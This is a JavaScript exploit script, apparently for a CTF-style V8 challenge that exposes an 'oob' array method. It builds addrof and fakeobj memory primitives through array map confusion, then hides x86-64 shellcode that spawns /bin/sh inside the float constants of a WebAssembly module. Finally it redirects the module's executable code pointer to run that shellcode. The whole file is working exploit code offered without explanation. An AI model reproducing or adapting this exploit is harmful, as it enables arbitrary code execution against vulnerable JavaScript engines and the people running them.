var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

arr = new Array(1.1, 1.1);
object_arr = new Array({}, {});
float_arr = new Array(2.2, 2.2);

arr.oob(0x100);

object_map = ftoi(arr[9]) & 0xffffffffn;
float_map = ftoi(arr[13]) & 0xffffffffn;

function addrof(o) {
    object_arr[0] = o;
    arr[9] = itof(float_map);
    ret = ftoi(object_arr[0]);
    arr[9] = itof(object_map);
    return ret & 0xffffffffn;
}

function fakeobj(a) {
    float_arr[0] = itof(a);
    arr[13] = itof(object_map);
    ret = float_arr[0];
    arr[13] = itof(float_map);
    return ret;
}

a = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x00, 0x01, 0x7c, 0x60, 0x00, 0x00, 0x03, 0x03, 0x02, 0x00, 0x01, 0x07, 0x0e, 0x02, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x03, 0x70, 0x77, 0x6e, 0x00, 0x01, 0x0a, 0x4c, 0x02, 0x47, 0x00, 0x44, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x58, 0xeb, 0x07, 0x44, 0x68, 0x2f, 0x62, 0x69, 0x00, 0x5b, 0xeb, 0x07, 0x44, 0x48, 0xc1, 0xe0, 0x18, 0x90, 0x90, 0xeb, 0x07, 0x44, 0x48, 0x01, 0xd8, 0x48, 0x31, 0xdb, 0xeb, 0x07, 0x44, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xd2, 0xeb, 0x07, 0x44, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x90, 0xeb, 0x07, 0x44, 0x0f, 0x05, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x07, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x0b, 0x02, 0x00, 0x0b]);
mod = new WebAssembly.Module(a.buffer);
instance = new WebAssembly.Instance(mod);          
main_func = instance.exports.main;


addr = addrof(instance);

control_array = [itof(float_map), 1.1, 1.2, 1.3];
fake_array = fakeobj(addrof(control_array) - 0x20n);

function fake_arr(a) {
    control_array[1] = itof((0x80n << 32n) | (a - 0x10n));
}

fake_arr(addr);
code_addr = ftoi(fake_array[11]);
console.log("wasm rwx code: 0x" + code_addr.toString(16));

for (let j = 0x0; j < 10000; j++) {
    main_func();
}

fake_array[11] = itof(code_addr + 0x75dn - 5n);


pwn_func = instance.exports.pwn;
pwn_func();